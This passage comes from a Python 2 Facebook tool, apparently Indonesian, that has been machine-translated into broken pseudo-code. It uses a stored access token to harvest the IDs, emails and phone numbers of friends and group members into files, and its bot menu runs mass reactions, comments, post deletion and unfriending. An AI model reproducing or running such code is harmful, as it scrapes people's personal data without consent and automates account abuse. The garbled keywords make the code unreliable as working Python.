                idfriends . tambahkan ( ah [ 'id' ])
                bz . tulis ( ah [ 'id' ] +  ' \ n ' )
                cetak  ' \ r \ x1b [1; 92mName \ x1b [1; 91m: \ x1b [1; 97m'  +  ah [ 'name' ]
                cetak  ' \ x1b [1; 92mID    \ x1b [1; 91m: \ x1b [1; 97m'  +  ah [ 'id' ]
                mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '

            cetak  ' \ n \ r \ x1b [1; 91m [+] \ x1b [1; 97mTotal ID \ x1b [1; 96m% s'  %  len ( idfriend )
            print  ' \ x1b [1; 91m [+] \ x1b [1; 97m File akses \ x1b [1; 91m: \ x1b [1; 97m'  +  save_id
            bz . tutup ()
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mKembali \ x1b [1; 91m]' )
            ambil ()
        kecuali  IOError :
            cetak  ' \ x1b [1; 91m [!] Kesalahan saat membuat file'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mKembali \ x1b [1; 91m]' )
            ambil ()
        kecuali ( KeyboardInterrupt , EOFError ):
            cetak  ' \ x1b [1; 91m [!] Berhenti'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mKembali \ x1b [1; 91m]' )
            ambil ()
        kecuali  KeyError :
            os . hapus ( save_id )
            cetak  ' \ x1b [1; 91m [!] Terjadi kesalahan'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mKembali \ x1b [1; 91m]' )
            ambil ()
        kecuali  permintaan . pengecualian . ConnectionError :
            cetak  ' \ x1b [1; 91m [ \ xe2 \ x9c \ x96 ] Tidak ada koneksi'
            keluar ()


def  idfrom_friends ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()
    lain :
        coba :
            os . sistem ( 'jelas' )
            cetak  logo
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            idt  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mInput ID Teman \ x1b [1; 91m: \ x1b [1; 97m' )
            coba :
                jok  =  permintaan . dapatkan ( 'https://graph.facebook.com/'  +  idt  +  '? access_token ='  +  toket )
                op  =  json . memuat ( jok . text )
                cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mDari \ x1b [1; 91m: \ x1b [1; 97m'  +  op [ 'nama' ]
            kecuali  KeyError :
                cetak  ' \ x1b [1; 91m [!] Jangan berteman'
                raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
                ambil ()

            r  =  permintaan . dapatkan ( 'https://graph.facebook.com/'  +  idt  +  '? bidang = teman.limit (5000) & access_token ='  +  toket )
            z  =  json . memuat ( r . teks )
            save_idt  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mSimpan File \ x1b [1; 97mext (file.txt) \ x1b [1; 91m: \ x1b [1; 97m' ))
            bz  =  buka ( save_idt , 'w' )
            jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mMohon Tunggu \ x1b [1; 97m ...' )
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            untuk  ah  di  z [ 'teman' ] [ 'data' ]:
                idfromfriends . tambahkan ( ah [ 'id' ])
                bz . tulis ( ah [ 'id' ] +  ' \ n ' )
                cetak  ' \ r \ x1b [1; 92mName \ x1b [1; 91m: \ x1b [1; 97m'  +  ah [ 'name' ]
                cetak  ' \ x1b [1; 92mID    \ x1b [1; 91m: \ x1b [1; 97m'  +  ah [ 'id' ]
                mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '

            cetak  ' \ n \ r \ x1b [1; 91m [+] \ x1b [1; 97mTotal ID \ x1b [1; 96m% s'  %  len ( idfromfriends )
            print  ' \ x1b [1; 91m [+] \ x1b [1; 97m File akses \ x1b [1; 91m: \ x1b [1; 97m'  +  save_idt
            bz . tutup ()
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mKembali \ x1b [1; 91m]' )
            ambil ()
        kecuali  IOError :
            cetak  ' \ x1b [1; 91m [!] Kesalahan saat membuat file'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mKembali \ x1b [1; 91m]' )
            ambil ()
        kecuali ( KeyboardInterrupt , EOFError ):
            cetak  ' \ x1b [1; 91m [!] Berhenti'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mKembali \ x1b [1; 91m]' )
            ambil ()
        kecuali  permintaan . pengecualian . ConnectionError :
            cetak  ' \ x1b [1; 91m [ \ xe2 \ x9c \ x96 ] Tidak ada koneksi'
            keluar ()


def  id_member_grup ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()
    lain :
        coba :
            os . sistem ( 'jelas' )
            cetak  logo
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            id  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mID grup \ x1b [1; 91m: \ x1b [1; 97m' )
            coba :
                r  =  permintaan . dapatkan ( 'https://graph.facebook.com/group/?id='  +  id  +  '& access_token ='  +  toket )
                asw  =  json . memuat ( r . teks )
                cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mNama grup \ x1b [1; 91m: \ x1b [1; 97m'  +  asw [ 'name' ]
            kecuali  KeyError :
                cetak  ' \ x1b [1; 91m [!] Grup tidak ditemukan'
                raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
                ambil ()

            simg  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 97mSimpan File \ x1b [1; 97mext (file.txt) \ x1b [1; 91m: \ x1b [1; 97m' ))
            b  =  buka ( simg , 'w' )
            jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mMohon Tunggu \ x1b [1; 97m ...' )
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            re  =  permintaan . dapatkan ( 'https://graph.facebook.com/'  +  id  +  '/ members? bidang = nama, id & access_token ='  +  toket )
            s  =  json . memuat ( ulang . teks )
            untuk  i  di  s [ 'data' ]:
                idmem . tambahkan ( i [ 'id' ])
                b . tulis ( i [ 'id' ] +  ' \ n ' )
                cetak  ' \ r \ x1b [1; 92mName \ x1b [1; 91m: \ x1b [1; 97m'  +  i [ 'name' ]
                cetak  ' \ x1b [1; 92mID   \ x1b [1; 91m: \ x1b [1; 97m'  +  i [ 'id' ]
                mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '

            cetak  ' \ n \ r \ x1b [1; 91m [+] \ x1b [1; 97mTotal ID \ x1b [1; 96m% s'  %  len ( idmem )
            cetak  ' \ x1b [1; 91m [+] \ x1b [1; 97mFile disimpan \ x1b [1; 91m: \ x1b [1; 97m'  +  simg
            b . tutup ()
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            ambil ()
        kecuali  IOError :
            cetak  ' \ x1b [1; 91m [!] Kesalahan saat membuat file'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            ambil ()
        kecuali ( KeyboardInterrupt , EOFError ):
            cetak  ' \ x1b [1; 91m [!] Berhenti'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            ambil ()
        kecuali  KeyError :
            os . hapus ( simg )
            cetak  ' \ x1b [1; 91m [!] Grup tidak ditemukan'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            ambil ()
        kecuali  permintaan . pengecualian . ConnectionError :
            cetak  ' \ x1b [1; 91m [ \ xe2 \ x9c \ x96 ] Tidak ada koneksi'
            keluar ()


def  email ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()
    lain :
        coba :
            os . sistem ( 'jelas' )
            cetak  logo
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            mails  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mSimpan File \ x1b [1; 97mext (file.txt) \ x1b [1; 91m: \ x1b [1; 97m' ))
            r  =  permintaan . dapatkan ( 'https://graph.facebook.com/me/friends?access_token='  +  toket )
            a  =  json . memuat ( r . teks )
            mpsh  =  terbuka ( mail , 'w' )
            jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...' )
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            untuk  saya  di  sebuah [ 'data' ]:
                x  =  permintaan . dapatkan ( 'https://graph.facebook.com/'  +  i [ 'id' ] +  '? access_token ='  +  toket )
                z  =  json . memuat ( x . teks )
                coba :
                    em . tambahkan ( z [ 'email' ])
                    mpsh . tulis ( z [ 'email' ] +  ' \ n ' )
                    cetak  ' \ r \ x1b [1; 92mName \ x1b [1; 91m: \ x1b [1; 97m'  +  z [ 'name' ]
                    cetak  ' \ x1b [1; 92mEmail \ x1b [1; 91m: \ x1b [1; 97m'  +  z [ 'email' ]
                    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
                kecuali  KeyError :
                    lulus

            cetak  ' \ n \ r \ x1b [1; 91m [+] \ x1b [1; 97mTotal Email \ x1b [1; 96m% s'  %  len ( em )
            cetak  ' \ x1b [1; 91m [+] \ x1b [1; 97mFile disimpan \ x1b [1; 91m: \ x1b [1; 97m'  +  mail
            mpsh . tutup ()
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            ambil ()
        kecuali  IOError :
            cetak  ' \ x1b [1; 91m [!] Kesalahan saat membuat file'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            ambil ()
        kecuali ( KeyboardInterrupt , EOFError ):
            cetak  ' \ x1b [1; 91m [!] Berhenti'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            ambil ()
        kecuali  KeyError :
            os . hapus ( email )
            cetak  ' \ x1b [1; 91m [!] Terjadi kesalahan'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            ambil ()
        kecuali  permintaan . pengecualian . ConnectionError :
            cetak  ' \ x1b [1; 91m [ \ xe2 \ x9c \ x96 ] Tidak ada koneksi'
            keluar ()


def  emailfrom_friends ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()
    lain :
        coba :
            os . sistem ( 'jelas' )
            cetak  logo
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            idt  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mInput ID Teman \ x1b [1; 91m: \ x1b [1; 97m' )
            coba :
                jok  =  permintaan . dapatkan ( 'https://graph.facebook.com/'  +  idt  +  '? access_token ='  +  toket )
                op  =  json . memuat ( jok . text )
                cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mDari \ x1b [1; 91m: \ x1b [1; 97m'  +  op [ 'nama' ]
            kecuali  KeyError :
                cetak  ' \ x1b [1; 91m [!] Jangan berteman'
                raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
                ambil ()

            mails  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mSimpan File \ x1b [1; 97mext (file.txt) \ x1b [1; 91m: \ x1b [1; 97m' ))
            r  =  permintaan . dapatkan ( 'https://graph.facebook.com/'  +  idt  +  '/ teman? access_token ='  +  toket )
            a  =  json . memuat ( r . teks )
            mpsh  =  terbuka ( mail , 'w' )
            jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...' )
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            untuk  saya  di  sebuah [ 'data' ]:
                x  =  permintaan . dapatkan ( 'https://graph.facebook.com/'  +  i [ 'id' ] +  '? access_token ='  +  toket )
                z  =  json . memuat ( x . teks )
                coba :
                    emfromfriends . tambahkan ( z [ 'email' ])
                    mpsh . tulis ( z [ 'email' ] +  ' \ n ' )
                    cetak  ' \ r \ x1b [1; 92mName \ x1b [1; 91m: \ x1b [1; 97m'  +  z [ 'name' ]
                    cetak  ' \ x1b [1; 92mEmail \ x1b [1; 91m: \ x1b [1; 97m'  +  z [ 'email' ]
                    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
                kecuali  KeyError :
                    lulus

            cetak  ' \ n \ r \ x1b [1; 91m [+] \ x1b [1; 97mTotal Email \ x1b [1; 96m% s'  %  len ( emfromfriends )
            cetak  ' \ x1b [1; 91m [+] \ x1b [1; 97mFile disimpan \ x1b [1; 91m: \ x1b [1; 97m'  +  mail
            mpsh . tutup ()
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            ambil ()
        kecuali  IOError :
            cetak  ' \ x1b [1; 91m [!] Kesalahan saat membuat file'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            ambil ()
        kecuali ( KeyboardInterrupt , EOFError ):
            cetak  ' \ x1b [1; 91m [!] Berhenti'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            ambil ()
        kecuali  permintaan . pengecualian . ConnectionError :
            cetak  ' \ x1b [1; 91m [ \ xe2 \ x9c \ x96 ] Tidak ada koneksi'
            keluar ()


def  nomor_hp ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()
    lain :
        coba :
            os . sistem ( 'jelas' )
            cetak  logo
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            noms  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mSimpan File \ x1b [1; 97mext (file.txt) \ x1b [1; 91m: \ x1b [1; 97m' ))
            url  =  'https://graph.facebook.com/me/friends?access_token='  +  toket
            r  =  permintaan . dapatkan ( url )
            z  =  json . memuat ( r . teks )
            no  =  terbuka ( noms , 'w' )
            jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...' )
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            untuk  n  dalam  z [ 'data' ]:
                x  =  permintaan . dapatkan ( 'https://graph.facebook.com/'  +  n [ 'id' ] +  '? access_token ='  +  toket )
                z  =  json . memuat ( x . teks )
                coba :
                    hp . append ( z [ 'mobile_phone' ])
                    tidak ada . tulis ( z [ 'mobile_phone' ] +  ' \ n ' )
                    cetak  ' \ r \ x1b [1; 92mName \ x1b [1; 91m: \ x1b [1; 97m'  +  z [ 'name' ]
                    cetak  ' \ x1b [1; 92mPhone \ x1b [1; 91m: \ x1b [1; 97m'  +  z [ 'mobile_phone' ]
                    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
                kecuali  KeyError :
                    lulus

            cetak  ' \ n \ r \ x1b [1; 91m [+] \ x1b [1; 97mTotal Telepon \ x1b [1; 96m% s'  %  len ( hp )
            cetak  ' \ x1b [1; 91m [+] \ x1b [1; 97mFile disimpan \ x1b [1; 91m: \ x1b [1; 97m'  +  noms
            tidak ada . tutup ()
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            ambil ()
        kecuali  IOError :
            cetak  ' \ x1b [1; 91m [!] Kesalahan saat membuat file'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            ambil ()
        kecuali ( KeyboardInterrupt , EOFError ):
            cetak  ' \ x1b [1; 91m [!] Berhenti'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            ambil ()
        kecuali  KeyError :
            os . hapus ( noms )
            cetak  ' \ x1b [1; 91m [!] Terjadi kesalahan'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            ambil ()
        kecuali  permintaan . pengecualian . ConnectionError :
            cetak  ' \ x1b [1; 91m [ \ xe2 \ x9c \ x96 ] Tidak ada koneksi'
            keluar ()


def  hpfrom_friends ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()
    lain :
        coba :
            os . sistem ( 'jelas' )
            cetak  logo
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            idt  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mMasukkan ID Teman \ x1b [1; 91m: \ x1b [1; 97m' )
            coba :
                jok  =  permintaan . dapatkan ( 'https://graph.facebook.com/'  +  idt  +  '? access_token ='  +  toket )
                op  =  json . memuat ( jok . text )
                cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mDari \ x1b [1; 91m: \ x1b [1; 97m'  +  op [ 'nama' ]
            kecuali  KeyError :
                cetak  ' \ x1b [1; 91m [!] Jangan berteman'
                raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
                ambil ()

            noms  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mSimpan File \ x1b [1; 97mext (file.txt) \ x1b [1; 91m: \ x1b [1; 97m' ))
            r  =  permintaan . dapatkan ( 'https://graph.facebook.com/'  +  idt  +  '/ teman? access_token ='  +  toket )
            a  =  json . memuat ( r . teks )
            no  =  terbuka ( noms , 'w' )
            jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...' )
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            untuk  saya  di  sebuah [ 'data' ]:
                x  =  permintaan . dapatkan ( 'https://graph.facebook.com/'  +  i [ 'id' ] +  '? access_token ='  +  toket )
                z  =  json . memuat ( x . teks )
                coba :
                    hpfromfriends . append ( z [ 'mobile_phone' ])
                    tidak ada . tulis ( z [ 'mobile_phone' ] +  ' \ n ' )
                    cetak  ' \ r \ x1b [1; 92mName \ x1b [1; 91m: \ x1b [1; 97m'  +  z [ 'name' ]
                    cetak  ' \ x1b [1; 92mPhone \ x1b [1; 91m: \ x1b [1; 97m'  +  z [ 'mobile_phone' ]
                    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
                kecuali  KeyError :
                    lulus

            cetak  ' \ n \ r \ x1b [1; 91m [+] \ x1b [1; 97mJumlah total \ x1b [1; 96m% s'  %  len ( hpfromfriends )
            cetak  ' \ x1b [1; 91m [+] \ x1b [1; 97mFile disimpan \ x1b [1; 91m: \ x1b [1; 97m'  +  noms
            tidak ada . tutup ()
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            ambil ()
        kecuali  IOError :
            cetak  ' \ x1b [1; 91m [!] Jadikan file gagal'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            ambil ()
        kecuali ( KeyboardInterrupt , EOFError ):
            cetak  ' \ x1b [1; 91m [!] Berhenti'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            ambil ()
        kecuali  permintaan . pengecualian . ConnectionError :
            cetak  ' \ x1b [1; 91m [ \ xe2 \ x9c \ x96 ] Tidak ada koneksi'
            keluar ()


def  menu_bot ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()

    os . sistem ( 'jelas' )
    cetak  logo
    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
    cetak  '║-> \ x1b [1; 37; 40m1. Posting Target Bot Reaksi '
    cetak  '║-> \ x1b [1; 37; 40m2. Posting Grup Bot Reaksi '
    cetak  '║-> \ x1b [1; 37; 40m3. Bot Komentar Target Posting '
    cetak  '║-> \ x1b [1; 37; 40m4. Bot Komentar Grup Posting '
    cetak  '║-> \ x1b [1; 37; 40m5. Hapus Massa Posting
    cetak  '║-> \ x1b [1; 37; 40m6. Terima Permintaan Teman
    cetak  '║-> \ x1b [1; 37; 40m7. Tidak berteman
    cetak  '║-> \ x1b [1; 31; 40m0. Kembali'
    cetak  ' \ x1b [1; 37; 40m║'
    bot_pilih ()


def  bot_pilih ():
    bot  =  raw_input ( '╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m' )
    jika  bot  ==  '' :
        mencetak  ' \ x1b [1;! 91m [] Can \' t kosong'
        bot_pilih ()
    lain :
        jika  bot  ==  '1' :
            menu_react ()
        lain :
            jika  bot  ==  '2' :
                grup_react ()
            lain :
                jika  bot  ==  '3' :
                    bot_komen ()
                lain :
                    jika  bot  ==  '4' :
                        grup_komen ()
                    lain :
                        jika  bot  ==  '5' :
                            deletepost ()
                        lain :
                            jika  bot  ==  '6' :
                                terima ()
                            lain :
                                jika  bot  ==  '7' :
                                    batalkan pertemanan ()
                                lain :
                                    jika  bot  ==  '0' :
                                        menu ()
                                    lain :
                                        cetak  ' \ x1b [1; 91m [ \ xe2 \ x9c \ x96 ] \ x1b [1; 97m'  +  bot  +  ' \ x1b [1; 91 tidak ditemukan'
                                        bot_pilih ()


def  menu_react ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()

    os . sistem ( 'jelas' )
    cetak  logo
    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
    cetak  '║-> \ x1b [1; 37; 40m1. \ x1b [1; 97mSeperti '
    cetak  '║-> \ x1b [1; 37; 40m2. \ x1b [1; 97mLove '
    cetak  '║-> \ x1b [1; 37; 40m3. \ x1b [1; 97mWow '
    cetak  '║-> \ x1b [1; 37; 40m4. \ x1b [1; 97mHaha '
    cetak  '║-> \ x1b [1; 37; 40m5. \ x1b [1; 97mSad '
    cetak  '║-> \ x1b [1; 37; 40m6. \ x1b [1; 97mAngry '
    cetak  '║-> \ x1b [1; 31; 40m0. Kembali'
    cetak  ' \ x1b [1; 37; 40m║'
    react_pilih ()


def  react_pilih ():
     tipe global
    aksi  =  raw_input ( '╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m' )
    jika  aksi  ==  '' :
        mencetak  ' \ x1b [1;! 91m [] Can \' t kosong'
        react_pilih ()
    lain :
        jika  aksi  ==  '1' :
            tipe  =  'LIKE'
            bereaksi ()
        lain :
            jika  aksi  ==  '2' :
                tipe  =  'LOVE'
                bereaksi ()
            lain :
                jika  aksi  ==  '3' :
                    tipe  =  'WOW'
                    bereaksi ()
                lain :
                    jika  aksi  ==  '4' :
                        tipe  =  'HAHA'
                        bereaksi ()
                    lain :
                        jika  aksi  ==  '5' :
                            tipe  =  'SAD'
                            bereaksi ()
                        lain :
                            jika  aksi  ==  '6' :
                                tipe  =  'ANGRY'
                                bereaksi ()
                            lain :
                                jika  aksi  ==  '0' :
                                    menu_bot ()
                                lain :
                                    cetak  ' \ x1b [1; 91m [ \ xe2 \ x9c \ x96 ] \ x1b [1; 97m'  +  aksi  +  ' \ x1b [1; 91 tidak ditemukan'
                                    react_pilih ()


def  bereaksi ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()
    lain :
        os . sistem ( 'jelas' )
        cetak  logo
        mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
        ide  =  raw_input ( ' \ x1b [1; 91m [+] \ x1b [1; 92mID Target \ x1b [1; 91m: \ x1b [1; 97m' )
        limit  =  raw_input ( ' \ x1b [1; 91m [!] \ x1b [1; 92mLimit \ x1b [1; 91m: \ x1b [1; 97m' )
        coba :
            oh  =  permintaan . dapatkan ( 'https://graph.facebook.com/'  +  ide  +  '? bidang = feed.limit ('  +  limit  +  ') & access_token ='  +  toket )
            ah  =  json . memuat ( oh . teks )
            jalan ( ' \ x1b [1; 91m [ \ xe2 \ x9c \ xba ] \ x1b [1; 92mSilakan tunggu \ x1b [1; 97m ...' )
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            untuk  sebuah  di  ah [ 'pakan' ] [ 'data' ]:
                y  =  a [ 'id' ]
                reaksi . tambahkan ( y )
                permintaan . pos ( 'https://graph.facebook.com/'  +  y  +  '/ reaksi? type ='  +  tipe  +  '& access_token ='  +  toket )
                cetak  ' \ x1b [1; 92m [ \ x1b [1; 97m'  +  y [: 10 ]. ganti ( ' \ n ' , '' ) +  '... \ x1b [1; 92m] \ x1b [1; 97m'  +  tipe

            mencetak
            cetak  ' \ r \ x1b [1; 91m [+] \ x1b [1; 97m Selesai \ x1b [1; 96m'  +  str ( len ( reaksi ))
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            menu_bot ()
        kecuali  KeyError :
            cetak  ' \ x1b [1; 91m [!] ID tidak ditemukan'
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            menu_bot ()


def  grup_react ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()

    os . sistem ( 'jelas' )
    cetak  logo
    mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
    cetak  '║-> \ x1b [1; 37; 40m1. \ x1b [1; 97mSeperti '
    cetak  '║-> \ x1b [1; 37; 40m2. \ x1b [1; 97mLove '
    cetak  '║-> \ x1b [1; 37; 40m3. \ x1b [1; 97mWow '
    cetak  '║-> \ x1b [1; 37; 40m4. \ x1b [1; 97mHaha '
    cetak  '║-> \ x1b [1; 37; 40m5. \ x1b [1; 97mSad '
    cetak  '║-> \ x1b [1; 37; 40m6. \ x1b [1; 97mAngry '
    cetak  '║-> \ x1b [1; 31; 40m0. Kembali'
    cetak  ' \ x1b [1; 37; 40m║'
    reactg_pilih ()


def  reactg_pilih ():
     tipe global
    aksi  =  raw_input ( '╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m' )
    jika  aksi  ==  '' :
        mencetak  ' \ x1b [1;! 91m [] Can \' t kosong'
        reactg_pilih ()
    lain :
        jika  aksi  ==  '1' :
            tipe  =  'LIKE'
            reactg ()
        lain :
            jika  aksi  ==  '2' :
                tipe  =  'LOVE'
                reactg ()
            lain :
                jika  aksi  ==  '3' :
                    tipe  =  'WOW'
                    reactg ()
                lain :
                    jika  aksi  ==  '4' :
                        tipe  =  'HAHA'
                        reactg ()
                    lain :
                        jika  aksi  ==  '5' :
                            tipe  =  'SAD'
                            reactg ()
                        lain :
                            jika  aksi  ==  '6' :
                                tipe  =  'ANGRY'
                                reactg ()
                            lain :
                                jika  aksi  ==  '0' :
                                    menu_bot ()
                                lain :
                                    cetak  ' \ x1b [1; 91m [ \ xe2 \ x9c \ x96 ] \ x1b [1; 97m'  +  aksi  +  ' \ x1b [1; 91 tidak ditemukan'
                                    reactg_pilih ()


def  reactg ():
    os . sistem ( 'jelas' )
    coba :
        toket  =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali  IOError :
        cetak  ' \ x1b [1; 91m [!] Token tidak ditemukan'
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 1 )
        login ()
    lain :
        os . sistem ( 'jelas' )
        cetak  logo
